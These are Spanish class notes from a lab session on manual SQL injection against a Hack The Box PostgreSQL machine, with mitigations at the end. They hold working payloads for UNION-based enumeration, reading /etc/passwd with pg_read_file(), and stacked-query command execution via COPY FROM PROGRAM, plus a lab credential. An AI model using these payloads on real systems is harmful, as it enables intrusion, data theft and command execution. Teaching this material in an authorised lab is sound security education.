---
tags:
- Auditoría web
date: '2026-09-10'
author: Carlos Castillo
---

# SQL Injection manual

<p class="note-meta">2026-09-10 · Carlos Castillo</p>

![](../../assets/img/sql-injection-manual/img001.png)

# **SQL Injection manual — metodología paso a paso**

|  |
| --- |
| **Contexto autorizado.** Práctica académica sobre una máquina de Hack The Box ya trabajada en la sesión anterior. La clase empieza directamente desde el dashboard para centrarse en la explotación manual de SQL Injection. |

## **1. Metadatos de la sesión**

| **Campo** | **Valor** |
| --- | --- |
| Profesor | Carlos Castillo |
| Fecha | 10/09/2026 |
| Tema principal | SQL Injection manual |
| Laboratorio | Hack The Box Starting Point — Vaccine (continuación de la sesión anterior) |
| DBMS observado | PostgreSQL |
| Herramientas principales | Burp Suite / Repeater, navegador, Hack The Box |
| Punto de partida | Acceso previo al dashboard; se omiten FTP, ZIP y John the Ripper ya vistos. |
| Siguiente práctica anunciada | GoodGames, con MySQL y un nivel mayor de dificultad. |

## **2. Objetivos de aprendizaje**

- Entender la lógica de una SQL Injection manual en lugar de delegar todo en sqlmap.
- Detectar una inyección a partir de errores y de alteraciones controladas de la consulta.
- Determinar el número de columnas necesarias para construir un UNION SELECT válido.
- Localizar qué posiciones del resultado son visibles en el frontend y qué tipos de dato aceptan.
- Reconocer el motor, el usuario de base de datos y la base de datos actual.
- Enumerar tablas y columnas mediante information\_schema.
- Extraer datos de forma controlada cuando ya conocemos la estructura.
- Relacionar privilegios de PostgreSQL con lectura de archivos y ejecución de comandos del sistema.

## **3. Resumen de la sesión**

La idea central es convertir la SQL Injection manual en una metodología reproducible. En vez de adivinar nombres, se avanza desde la evidencia: confirmar la vulnerabilidad, averiguar columnas, identificar posiciones visibles, reconocer el entorno, enumerar estructura y finalmente consultar datos concretos.

El profesor insiste en que cada paso depende del anterior. El objetivo no es memorizar un payload aislado, sino comprender cómo se modifica la consulta original y cómo interpretar la respuesta.

## **4. Conexión con la sesión anterior**

Se reutiliza la misma máquina de la clase anterior. No se repiten la enumeración, FTP, recuperación del backup ZIP ni cracking con John the Ripper. El punto de partida es el dashboard ya accesible.

|  |
| --- |
| **Credencial reutilizada en clase.** Se vuelve a acceder al dashboard con el usuario admin y la contraseña qwerty789. Es una credencial del laboratorio académico ya obtenida previamente; no es un hallazgo nuevo de esta sesión. |

## **5. Modelo mental: niveles de una base de datos**

La clase organiza la estructura en niveles para justificar el orden de la enumeración:

| **Nivel** | **Qué representa** | **Por qué importa en SQLi manual** |
| --- | --- | --- |
| Servidor / DBMS | Motor que procesa las consultas. | La sintaxis y funciones cambian entre PostgreSQL, MySQL/MariaDB, etc. |
| Base de datos | Contenedor lógico de objetos. | Necesitamos saber dónde estamos trabajando. |
| Esquema | Espacio de nombres dentro de una base de datos. | Permite agrupar y acotar tablas y objetos. |
| Tabla | Conjunto de registros. | Debemos conocerla antes de pedir columnas o datos concretos. |
| Columna | Campo de cada registro. | Indica qué dato podemos solicitar con SELECT. |
| Fila / dato | Valor almacenado. | Es la información final que se quiere consultar. |

|  |
| --- |
| **Corrección conceptual.** En PostgreSQL, base de datos y esquema son niveles distintos. information\_schema describe objetos de la base de datos actual; no debe interpretarse literalmente como una «mini base de datos». |

# **6. SQL Injection manual: flujo completo**

| **Paso** | **Objetivo** | **Fase de auditoría** |
| --- | --- | --- |
| 0 | Detectar y confirmar la SQL Injection | Análisis de vulnerabilidades |
| 1 | Determinar el número de columnas | Análisis de vulnerabilidades |
| 2 | Identificar columnas visibles y tipos compatibles | Análisis de vulnerabilidades |
| 3 | Reconocer motor, usuario y base de datos actual | Recogida de información |
| 4 | Enumerar tablas y columnas | Recogida de información |
| 5 | Extraer datos concretos | Pruebas de explotación controladas |
| 6 | Probar capacidades privilegiadas: archivos/comandos | Pruebas de explotación controladas |

## **6.1. Paso 0 — detectar y confirmar la vulnerabilidad**

El buscador de coches filtra por nombre. Al introducir una comilla simple se produce un error y la aplicación llega a mostrar la consulta SQL, lo que revela la tabla cars y el uso de ILIKE.

**Consulta reconstruida a partir del error mostrado**

|  |
| --- |
| SELECT \* FROM cars WHERE name ILIKE '%<entrada\_del\_usuario>%' |

La clase confirma el control de la consulta con una condición siempre verdadera:

|  |
| --- |
| ' OR 1=1 -- - |

Si la respuesta devuelve todos los registros, la inyección deja de ser una mera sospecha: se ha cerrado la expresión original, añadido lógica propia y neutralizado el resto mediante comentario.

|  |
| --- |
| **Importante.** El delimitador exacto, los espacios y el URL encoding dependen de la petición concreta. Por eso la práctica continúa en Burp Repeater, donde cada carácter puede controlarse. |

## **6.2. Burp Repeater como entorno de trabajo**

Una vez confirmada la inyección, la petición del buscador se captura y se envía a Repeater. Así se pueden repetir pruebas, comparar respuestas y aplicar URL encoding cuando sea necesario.

| **Elemento** | **Uso en la práctica** |
| --- | --- |
| Captura HTTP | Obtener la petición real generada por el buscador. |
| Send to Repeater | Crear una copia de trabajo reproducible. |
| Repeater | Modificar únicamente el parámetro vulnerable y reenviar. |
| URL encoding | Codificar caracteres especiales cuando el request lo requiera. |
| Respuesta | Comprobar error, fila añadida, contenido extraído o salida de comando. |

## **6.3. Paso 1 — determinar el número de columnas**

UNION exige que ambas SELECT devuelvan el mismo número de columnas. La clase usa ORDER BY como sonda incremental.

|  |
| --- |
| ' ORDER BY 5 -- - ' ORDER BY 6 -- - |

| **Prueba** | **Resultado observado** | **Conclusión** |
| --- | --- | --- |
| ORDER BY 5 | Funciona. | Existe una quinta posición. |
| ORDER BY 6 | Falla. | No existe una sexta posición. |
| Conclusión | 5 funciona y 6 falla. | La consulta devuelve 5 columnas. |

|  |
| --- |
| **Resultado confirmado.** La consulta vulnerable de esta máquina tiene 5 columnas, aunque el frontend no muestre necesariamente las cinco. |

## **6.4. Paso 2 — columnas visibles y tipos de dato**

Con cinco posiciones ya se puede construir UNION SELECT. Se empieza con NULL porque es un valor flexible durante la primera comprobación.

|  |
| --- |
| ' UNION SELECT NULL,NULL,NULL,NULL,NULL -- - |

Después se sustituye una posición cada vez por una cadena reconocible:

|  |
| --- |
| ' UNION SELECT NULL,'AAAA',NULL,NULL,NULL -- - ' UNION SELECT NULL,NULL,'BBBB',NULL,NULL -- - ' UNION SELECT NULL,NULL,NULL,'CCCC',NULL -- - ' UNION SELECT NULL,NULL,NULL,NULL,'DDDD' -- - |

| **Posición** | **Visibilidad observada** | **Tipo compatible deducido** |
| --- | --- | --- |
| 1 | No visible | No es necesario fijarlo para exfiltrar por pantalla. |
| 2 | Visible | Texto / string compatible. |
| 3 | Visible | Texto / string compatible. |
| 4 | Visible | Texto / string compatible. |
| 5 | Visible | Texto / string compatible. |

|  |
| --- |
| **Idea clave.** Para extraer un valor mediante UNION-based SQLi necesitamos colocarlo en una posición que el frontend realmente renderice. |

## **6.5. Paso 3 — reconocimiento del motor y contexto**

Se sustituyen posiciones visibles por funciones de información de PostgreSQL:

|  |
| --- |
| ' UNION SELECT NULL,version(),NULL,NULL,NULL -- - ' UNION SELECT NULL,current\_user,NULL,NULL,NULL -- - ' UNION SELECT NULL,current\_database(),NULL,NULL,NULL -- - |

| **Expresión** | **Qué aporta** | **Resultado de la sesión** |
| --- | --- | --- |
| version() | Versión y plataforma del servidor PostgreSQL. | Se identificó PostgreSQL 11.7 sobre Ubuntu. |
| current\_user | Rol efectivo de la consulta. | Se obtuvo durante la práctica; la transcripción no conserva un valor literal fiable. |
| current\_database() | Base de datos actual. | Se obtuvo durante la práctica; no se fija un valor que no quede inequívoco. |

|  |
| --- |
| **Sintaxis PostgreSQL.** current\_user se usa sin paréntesis. current\_database() y version() sí llevan paréntesis. |

## **6.6. PostgreSQL frente a MySQL/MariaDB**

| **Dato** | **PostgreSQL visto** | **MySQL / MariaDB citado en clase** |
| --- | --- | --- |
| Versión | version() | @@version |
| Base actual | current\_database() | database() |
| Metadatos | information\_schema | information\_schema |
| Tablas | information\_schema.tables | information\_schema.tables |
| Columnas | information\_schema.columns | information\_schema.columns |

|  |
| --- |
| **Pendiente de la siguiente sesión.** GoodGames se utilizará para repetir la misma metodología sobre MySQL y practicar concatenación/agrupación de resultados con algo más de dificultad. |

## **6.7. Paso 4 — enumerar tablas**

Para obtener nombres de tablas accesibles se consulta information\_schema.tables:

|  |
| --- |
| ' UNION SELECT NULL,table\_name,NULL,NULL,NULL FROM information\_schema.tables -- - |

Durante la clase se intenta filtrar además por table\_schema, pero el resultado es inconsistente. El profesor decide retirar temporalmente el filtro y dejar la causa para revisión.

**Variante intentada**

|  |
| --- |
| ' UNION SELECT NULL,table\_name,NULL,NULL,NULL FROM information\_schema.tables WHERE table\_schema = '<esquema>' -- - |

|  |
| --- |
| **Pendiente de confirmar.** No se establece una causa definitiva del fallo del filtro por esquema. La sesión baraja posibilidades, pero no hay evidencia suficiente para atribuirlo a una causa concreta. |

## **6.8. Paso 4 — enumerar columnas**

Con un nombre de tabla ya identificado se consulta information\_schema.columns:

|  |
| --- |
| ' UNION SELECT NULL,column\_name,NULL,NULL,NULL FROM information\_schema.columns WHERE table\_name = 'pg\_user' -- - |

La práctica inspecciona pg\_user como ejemplo de vista del propio PostgreSQL. No debe confundirse con una tabla de usuarios de la aplicación web.

|  |
| --- |
| **Corrección técnica verificada.** En pg\_user el nombre del usuario está en la columna usename, no username. Además, passwd no expone la contraseña: devuelve \*\*\*\*\*\*\*\*. La transcripción mezcla algunos nombres por reconocimiento de voz. |

## **6.9. Paso 5 — extraer datos**

Una vez conocemos tabla y columna, colocamos la columna deseada en una posición visible:

|  |
| --- |
| ' UNION SELECT NULL,usename,NULL,NULL,NULL FROM pg\_user -- - ' UNION SELECT NULL,passwd,NULL,NULL,NULL FROM pg\_user -- - |

La segunda consulta no equivale a extraer credenciales de la aplicación: pg\_user enmascara passwd. La propia clase recuerda que las credenciales del dashboard de esta máquina estaban hardcodeadas en el código de la aplicación.

# **7. Privilegios y capacidades adicionales en PostgreSQL**

La última parte muestra que una SQLi puede tener un impacto mucho mayor cuando el usuario del DBMS tiene privilegios elevados.

## **7.1. Comprobar si el rol es superusuario**

|  |
| --- |
| ' UNION SELECT NULL,  (SELECT usesuper::text FROM pg\_user WHERE usename = current\_user),  NULL,NULL,NULL -- - |

Durante la demostración la consulta devuelve true, confirmando un contexto privilegiado en el laboratorio.

|  |
| --- |
| **Riesgo.** El mínimo privilegio es crítico: un rol web no debería disponer de capacidades de superusuario ni permisos equivalentes. |

## **7.2. Lectura de archivos con pg\_read\_file()**

|  |
| --- |
| ' UNION SELECT NULL,pg\_read\_file('/etc/passwd'),NULL,NULL,NULL -- - |

La demostración permite leer un archivo del servidor. El resultado recuerda a un LFI, pero el vector no es Path Traversal/LFI: la capacidad se alcanza a través de SQL Injection y una función del DBMS.

|  |
| --- |
| **Diferencia conceptual.** Dos vulnerabilidades distintas pueden acabar exponiendo archivos locales; eso no las convierte en la misma vulnerabilidad. |

## **7.3. Ejecución de comandos con COPY ... FROM PROGRAM**

La clase separa ejecución y visualización en dos peticiones. Primero se crea una tabla y se guarda stdout del comando; después se consulta esa tabla.

**Petición A — ejecutar y guardar la salida**

|  |
| --- |
| '; DROP TABLE IF EXISTS x; CREATE TABLE x(o text); COPY x FROM PROGRAM 'id'; -- - |

**Petición B — visualizar la salida**

|  |
| --- |
| ' UNION SELECT NULL,o,NULL,NULL,NULL FROM x -- - |

Se prueban comandos como id, ls y ls /home. El punto esencial es que COPY ejecuta el programa en el servidor y captura su salida; UNION SELECT permite recuperarla después desde una columna visible.

|  |
| --- |
| **Requisito de privilegios.** COPY ... FROM PROGRAM requiere un superusuario o un rol con permiso específico equivalente y queda sujeto a los permisos del usuario del sistema operativo que ejecuta PostgreSQL. |

|  |
| --- |
| **Reverse shell mencionada, no reconstruida.** Se recuerda la reverse shell de la sesión anterior. La transcripción actual no contiene un payload completo y fiable, por lo que no se inventa ni se completa aquí. |

# **8. Qué está ocurriendo realmente al inyectar**

| **Elemento** | **Función conceptual** |
| --- | --- |
| Comilla ' | Cierra el literal donde el backend insertaba la entrada. |
| OR 1=1 | Demuestra control lógico de la condición. |
| ORDER BY | Sirve como sonda para contar columnas. |
| UNION SELECT | Añade filas con la misma estructura de columnas. |
| NULL | Rellena posiciones durante pruebas de compatibilidad. |
| AAAA/BBBB… | Localiza posiciones visibles. |
| -- - | Comenta el resto de la sentencia cuando la sintaxis lo permite. |
| information\_schema | Permite consultar metadatos de tablas y columnas. |

# **9. Problemas reales observados durante la práctica**

| **Problema** | **Qué ocurrió** | **Interpretación correcta** |
| --- | --- | --- |
| Máquina inestable | Hubo fallos/reinicios durante la sesión. | No asumir que todo error procede del payload. |
| Filtro table\_schema | La variante con WHERE no se comportó como se esperaba. | Queda pendiente; no asignar una causa sin evidencia. |
| URL encoding | Algunos payloads necesitaron ajustar codificación. | Separar sintaxis SQL de representación HTTP. |
| Tipos de dato | Algunos números en posiciones de texto generaron errores. | Empezar con NULL y probar una posición cada vez. |
| pg\_user.passwd | Aparece enmascarado. | No es una contraseña real extraída. |
| Nombres exactos | Un carácter erróneo rompe la consulta. | Enumerar y copiar antes de adivinar. |

# **10. Metodología de auditoría aplicada**

## **10.1. Planificación**

- Entorno autorizado: máquina de Hack The Box ya trabajada.
- Objetivo: practicar SQL Injection manual y no repetir toda la enumeración.
- Punto de entrada: buscador del dashboard.

## **10.2. Recogida de información**

- Consulta revelada por mensajes de error.
- Tabla cars y filtro sobre name mediante ILIKE.
- DBMS y versión mediante version().
- Usuario actual mediante current\_user.
- Base actual mediante current\_database().
- Tablas y columnas mediante information\_schema.

## **10.3. Análisis de vulnerabilidades**

- La comilla simple altera la consulta.
- OR 1=1 confirma control lógico.
- ORDER BY 5 / 6 determina cinco columnas.
- UNION SELECT con marcadores identifica posiciones visibles.
- El conjunto de evidencias confirma una SQL Injection manualmente explotable.

## **10.4. Pruebas de explotación controladas**

- Enumeración de estructura con information\_schema.
- Consulta de pg\_user.
- Comprobación de usesuper.
- Lectura de /etc/passwd con pg\_read\_file().
- Ejecución de comandos con COPY ... FROM PROGRAM y recuperación de stdout desde tabla temporal.

# **11. Ampliación técnica — validación con documentación oficial**

|  |
| --- |
| **Ampliación técnica.** Esta sección no sustituye lo visto en clase. Se usa únicamente para corregir nombres exactos y matizar requisitos de PostgreSQL. |

| **Punto** | **Validación** |
| --- | --- |
| pg\_user | Expone usename y usesuper. passwd se muestra como \*\*\*\*\*\*\*\*. |
| current\_user | Se usa sin paréntesis y representa el usuario efectivo para permisos. |
| information\_schema.tables | Enumera tablas/vistas de la base actual a las que el usuario tiene acceso. |
| pg\_read\_file() | Lee archivos del servidor; en PostgreSQL 11 está restringida a superusuarios por defecto, aunque puede delegarse EXECUTE. |
| COPY FROM PROGRAM | Ejecuta un programa en el servidor; requiere superusuario o pg\_execute\_server\_program / permisos equivalentes. |

# **12. Mitigaciones y buenas prácticas**

|  |
| --- |
| **Ampliación técnica.** Medidas defensivas derivadas de la vulnerabilidad trabajada. |

- Usar consultas parametrizadas / prepared statements en lugar de concatenar entrada del usuario.
- Aplicar mínimo privilegio al rol de base de datos de la aplicación.
- No mostrar consultas SQL ni errores internos detallados al frontend.
- Restringir funciones y roles con acceso a archivos o ejecución de programas.
- Validar y registrar anomalías sin confiar en listas negras como sustituto de la parametrización.
- Evitar credenciales hardcodeadas en el código fuente.

# **13. Apunte lateral de clase — gestión de agentes y terminales**

Antes del laboratorio hubo una conversación sobre herramientas para organizar sesiones de terminal y agentes de código. El profesor mostró una herramienta que la transcripción recoge como «Paseo», orientada a workspaces por proyecto, pestañas de terminal y continuidad de sesiones, incluido acceso desde móvil mientras el equipo principal permanece encendido. También citó «Superset» como alternativa/orquestador.

|  |
| --- |
| **Pendiente de confirmar.** La transcripción no conserva de forma fiable el nombre comercial exacto ni la URL de «Paseo». No se añade enlace ni se atribuyen funciones no vistas. |

Conceptualmente, estas herramientas son aplicaciones/orquestadores, no modelos de IA. Pueden organizar terminales o sesiones donde se utilizan herramientas/agentes como Claude Code, Codex o Cursor.

# **14. Registro de herramientas**

| **Herramienta** | **Objetivo** | **Fase** | **Uso visto** | **Nivel** |
| --- | --- | --- | --- | --- |
| Hack The Box | Entorno autorizado | Planificación | Starting Point / Vaccine | Usada en auditoría |
| Burp Suite | Capturar/repetir HTTP | Análisis | Enviar buscador a Repeater | Practicada |
| Burp Repeater | Iterar payloads | Análisis/explotación | ORDER BY, UNION, enumeración, comandos | Usada en auditoría |
| PostgreSQL | DBMS objetivo | Recogida/explotación | Funciones, information\_schema, pg\_user | Practicada |
| sqlmap | Automatizar SQLi | Análisis/explotación | Contraste con el proceso manual | Introducida |
| John the Ripper | Cracking previo | Recogida | Mencionada; se omite hoy | Practicada |
| Paseo (por confirmar) | Workspaces/terminales | No aplica | Demostración lateral | Mencionada |
| Superset | Orquestación de terminales | No aplica | Alternativa citada | Mencionada |

# **15. Checklist de estudio**

☐ Puedo explicar por qué la comilla simple es una prueba de detección.

☐ Sé usar ORDER BY para deducir el número de columnas.

☐ Entiendo por qué UNION SELECT necesita el mismo número de columnas.

☐ Sé por qué se usa NULL al principio.

☐ Sé localizar columnas visibles mediante marcadores.

☐ Distingo version(), current\_user y current\_database().

☐ Sé obtener table\_name desde information\_schema.tables.

☐ Sé obtener column\_name desde information\_schema.columns.

☐ Distingo pg\_user de una tabla de usuarios de la aplicación.

☐ Entiendo por qué pg\_user.passwd no entrega una contraseña real.

☐ Puedo explicar qué privilegios hacen peligrosa pg\_read\_file().

☐ Puedo explicar las dos peticiones necesarias para COPY ... FROM PROGRAM + UNION SELECT.

☐ No confundo lectura de archivos mediante SQLi con LFI/Path Traversal.

☐ Sé qué se repetirá en GoodGames y qué cambia al pasar a MySQL.

# **16. Glosario**

| **Término** | **Definición** |
| --- | --- |
| SQL Injection | Entrada controlada por el usuario que altera la sentencia SQL ejecutada por la aplicación. |
| UNION-based SQLi | Técnica que añade el resultado de otra SELECT compatible. |
| ORDER BY | Cláusula usada aquí para inferir cuántas columnas admite la consulta. |
| NULL | Ausencia de valor; útil como relleno flexible en UNION SELECT. |
| ILIKE | Operador PostgreSQL para comparación de texto sin distinguir mayúsculas/minúsculas. |
| information\_schema | Vistas estándar que describen objetos SQL. |
| pg\_user | Vista PostgreSQL de usuarios/roles con contraseña enmascarada. |
| current\_user | Rol efectivo usado para comprobar permisos. |
| usesuper | Booleano que indica si un usuario es superusuario. |
| pg\_read\_file() | Función que puede leer archivos del servidor si los permisos lo permiten. |
| COPY FROM PROGRAM | Ejecuta un programa en el servidor y lee su stdout como entrada de COPY. |
| Repeater | Módulo de Burp Suite para repetir y modificar peticiones HTTP. |

# **17. Pendientes y siguiente sesión**

- Revisar por qué WHERE table\_schema = ... se comportó de forma inconsistente en Vaccine.
- Repetir la metodología manual hasta interiorizar el orden de los pasos.
- Practicar GoodGames: cambio a MySQL, consultas algo más complejas y concatenación de resultados.
- No hay payload completo de reverse shell en esta transcripción; usar la sesión anterior si se documenta.
- Confirmar nombre/URL exacto de la herramienta «Paseo».

# **18. Actualización de memoria del proyecto**

| **Categoría** | **Información nueva** | **Certeza** | **Acción futura** |
| --- | --- | --- | --- |
| Sesión | SQL Injection manual sobre Vaccine; continuación del laboratorio anterior. | Alta | Conectar con GoodGames. |
| Profesor | Carlos Castillo. | Alta | Mantener en metadatos. |
| Fecha | 10/09/2026. | Alta | Usar como fecha de clase. |
| SQLi | Detección → columnas → visibilidad → contexto DB → tablas/columnas → datos → privilegios. | Alta | Reutilizar como plantilla. |
| PostgreSQL | Se identificó 11.7; version(), current\_user, current\_database(), information\_schema, pg\_user. | Alta | Comparar con MySQL. |
| Privilegios | usesuper devolvió true; se demostraron pg\_read\_file() y COPY FROM PROGRAM. | Alta | Relacionar con mínimo privilegio. |
| Corrección | En pg\_user es usename; passwd está enmascarado. | Alta | Evitar error de transcripción. |
| Pendiente | Causa del fallo table\_schema no confirmada. | Alta | Revisar después. |
| Pendiente | Nombre/URL exacto de «Paseo» no confirmado. | Media | Confirmar antes de registrar. |

# **19. Fuentes y verificación**

Fuente principal: transcripción de la sesión aportada por Chema.

Documentación oficial utilizada únicamente para validación técnica:

• [PostgreSQL 11 — COPY](https://www.postgresql.org/docs/11/sql-copy.html)

• [PostgreSQL 11 — System Administration Functions](https://www.postgresql.org/docs/11/functions-admin.html)

• [PostgreSQL 11 — Information Schema](https://www.postgresql.org/docs/11/information-schema.html)

• [PostgreSQL 11 — information\_schema.tables](https://www.postgresql.org/docs/11/infoschema-tables.html)

• [PostgreSQL — pg\_user](https://www.postgresql.org/docs/current/view-pg-user.html)

• [PostgreSQL — System Information Functions](https://www.postgresql.org/docs/current/functions-info.html)

|  |
| --- |
| **Control de fidelidad.** No se han inventado flags, hashes, IP, puertos ni credenciales adicionales. Los valores no conservados de forma inequívoca se dejan sin concretar. Las correcciones de sintaxis están separadas como validación técnica. |
